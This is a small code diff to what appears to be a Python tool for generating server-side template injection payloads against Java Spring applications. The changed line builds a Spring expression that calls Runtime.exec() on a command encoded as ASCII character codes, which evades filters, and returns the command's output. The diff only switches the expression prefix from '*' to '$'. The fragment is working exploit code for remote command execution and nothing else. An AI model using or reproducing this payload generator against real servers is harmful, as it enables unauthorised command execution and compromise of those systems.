@@ -45,7 +45,7 @@ def ssti_generator():
 
 	skip_code = ''.join(map(str, payload_outputs))
 
-	ssti_payload_generator = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("+str(ascii_values[0])+")"+str(skip_code)+").getInputStream())}"
+	ssti_payload_generator = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("+str(ascii_values[0])+")"+str(skip_code)+").getInputStream())}"
 	
 	print('\n')
 	
